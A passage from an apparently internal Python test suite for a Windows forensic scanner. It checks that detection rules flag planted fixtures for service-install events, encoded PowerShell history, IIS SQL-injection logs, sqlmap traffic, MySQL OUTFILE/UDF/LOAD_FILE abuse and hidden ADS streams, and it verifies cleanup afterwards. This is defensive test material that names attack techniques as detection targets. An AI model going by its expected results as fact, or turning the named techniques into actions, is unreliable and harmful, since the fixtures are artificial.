            bad("F36 WIN.EVT.SVC7045.001 MISSING for ctfir-marker-svc")
        f4697 = has_rule(findings, "WIN.EVT.SVC7045.001", "4697")
        # specifically Security 4697 for our service
        hit_4697 = False
        for f in rule_hits(findings, "WIN.EVT.SVC7045.001"):
            blob = (f.get("object_ref") or "") + (f.get("rationale") or "")
            if "4697" in blob and "ctfir-marker-svc" in blob:
                hit_4697 = True
                break
        if hit_4697:
            ok("F36b Security 4697 hit for ctfir-marker-svc")
        else:
            # not a hard fail if audit policy cannot emit 4697; record
            note("Security 4697 for ctfir-marker-svc not observed (audit policy / event delay). 7045 is the System-channel counterpart.")
            # still count as informational; do not fail the suite if 7045 passed
        # F37 system service negative: svchost / System32 should not appear as SVC7045
        fp37 = False
        for f in rule_hits(findings, "WIN.EVT.SVC7045.001"):
            blob = ((f.get("rationale") or "") + (f.get("object_ref") or "")).lower()
            if "system32\\svchost" in blob or "system32/svchost" in blob:
                fp37 = True
        if fp37:
            bad("F37 system32 svchost falsely flagged as SVC7045")
        else:
            ok("F37 system service not flagged (no System32 svchost in SVC7045)")
        # F38 pshist positive (isolated)
        assert_pos(findings, "F38", "WIN.TRACE.PSHIST.001", "enc", "encodedcommand in fixture")
        # F39 will be a dedicated scan with only the clean file
        # F43 SQLi
        assert_pos(findings, "F43", "WIN.WEB.LOGATTACK.001", "W3SVC99", "IIS SQLi/traversal")
        # F44 W3SVC98 should not appear in LOGATTACK
        assert_neg_needle(findings, "F44", "WIN.WEB.LOGATTACK.001", "W3SVC98", "normal GET log")
        # F45 phpstudy sqlmap UA
        assert_pos(findings, "F45", "WIN.WEB.LOGATTACK.001", "phpstudy", "phpstudy sqlmap UA")
        # MySQL windows
        assert_pos(findings, "M01", "MID.MYSQL.SLOWLOG.001", "MySQL-ctfir-marker", "phpstudy slow INTO OUTFILE")
        assert_pos(findings, "M02", "MID.MYSQL.BINLOG.001", "MySQL-ctfir-marker", "phpstudy binlog UDF")
        assert_pos(findings, "M03", "MID.MYSQL.LOGSHELL.001", "MySQL-ctfir-marker", "phpstudy general LOAD_FILE")
        assert_neg_needle(findings, "M04", "MID.MYSQL.SLOWLOG.001", "mysql-slow-normal", "normal SELECT slow log")
        # ADS
        assert_pos(findings, "F40", "WIN.FILES.ADS.001", "hidden.exe", "ADS hidden stream")
        assert_neg_needle(findings, "F41", "WIN.FILES.ADS.001", "Zone.Identifier", "Zone.Identifier ignored")

        # F39 isolated negative PSHIST scan
        envn = {"CTFIR_FIXTURE_PSHIST": pshist_neg}
        rc2, f2, e2, _ = scan(c.bin, out_pshist_neg, None, envn)
        # Must not report PSHIST on the clean file; and must not have read real user history
        real_hist_leak = False
        for f in rule_hits(f2, "WIN.TRACE.PSHIST.001"):
            ref = (f.get("object_ref") or "") + (f.get("rationale") or "")
            if "clean_history" in ref:
                bad("F39 clean history false positive")
                real_hist_leak = True
            if "AppData\\Roaming\\Microsoft\\Windows\\PowerShell" in ref.replace("/", "\\"):
                bad("F39 leaked real user PS history (CTFIR_FIXTURE_PSHIST isolation failed): %s" % ref[:160])
                real_hist_leak = True
        if not real_hist_leak and not has_rule(f2, "WIN.TRACE.PSHIST.001"):
            ok("F39 pshist clean fixture: no PSHIST finding, no real-history leak")
        elif not real_hist_leak:
            # PSHIST findings exist but not from clean or real? unexpected
            leftover = [x.get("object_ref") for x in rule_hits(f2, "WIN.TRACE.PSHIST.001")]
            if leftover:
                bad("F39 unexpected PSHIST hits: %s" % leftover)
            else:
                ok("F39 pshist clean fixture: no PSHIST finding")

        # Confirm F38 isolation also did not include real history path
        for f in rule_hits(findings, "WIN.TRACE.PSHIST.001"):
            ref = f.get("object_ref") or ""
            if "AppData\\Roaming\\Microsoft\\Windows\\PowerShell" in ref.replace("/", "\\") and "ctfir-marker" not in ref.lower():
                bad("F38 read real user PS history: %s" % ref[:160])
                break
        else:
            ok("F38 PSHIST isolated to fixture (no real user history path)")

    except Exception:
        traceback.print_exc()
        bad("exception during setup/scan: %s" % sys.exc_info()[1])
    finally:
        # Restore registry/service/files BEFORE clean rescan
        run_cleaners()
        # re-register empty atexit already popped
        time.sleep(0.5)

    # Clean rescan: leftover markers (except persistent events)
    try:
        # Empty pshist fixture so we don't depend on real history
        empty_dir = os.path.join(work_root(), "pshist-empty")
        os.makedirs(empty_dir, exist_ok=True)
        empty_f = os.path.join(empty_dir, "ConsoleHost_history.txt")
        with open(empty_f, "w") as f:
            f.write("Get-Date\n")
        rc3, f3, e3, _ = scan(bin_path, out_clean, None, {"CTFIR_FIXTURE_PSHIST": empty_f})
        print("clean scan rc=%s findings=%d" % (rc3, len(f3)))
        leftover_rules = []
        persistent_ok = []
        for f in f3:
            blob = ((f.get("object_ref") or "") + " " + (f.get("rationale") or "")).lower()
            if "ctfir-marker" not in blob and "ctfir-marker" not in (f.get("rule_id") or "").lower():
                continue
            rid = f.get("rule_id") or ""
            # Event-log records persist: 7045/4697/4625 — expected
            if rid == "WIN.EVT.SVC7045.001" or rid == "WIN.EVT.AUTHFAIL.001":
                persistent_ok.append(rid + ":" + (f.get("object_ref") or "")[:60])
                continue
            leftover_rules.append(rid + ":" + (f.get("object_ref") or "")[:80])
        if leftover_rules:
            bad("cleanup residue: " + " | ".join(leftover_rules[:8]))
        else:
            ok("cleanup verified (no leftover service/reg/file findings)")
        if persistent_ok:
            note("event-log residual (expected, not cleared): " + " | ".join(persistent_ok[:6]))
        # Service itself must be gone
        rc, out = run(["sc.exe", "query", "ctfir-marker-svc"])
        if rc == 0 and "SERVICE_NAME" in out:
            bad("service ctfir-marker-svc still exists after cleanup")
        else:
            ok("service ctfir-marker-svc deleted")
        shutil.rmtree(empty_dir, ignore_errors=True)
        shutil.rmtree(work_root(), ignore_errors=True)
    except Exception:
        traceback.print_exc()
        bad("exception during clean rescan: %s" % sys.exc_info()[1])

    print("=== 结果: pass=%d fail=%d ===" % (PASS, FAIL))
    for n in NOTES:
        print("  note:", n)
    return 0 if FAIL == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
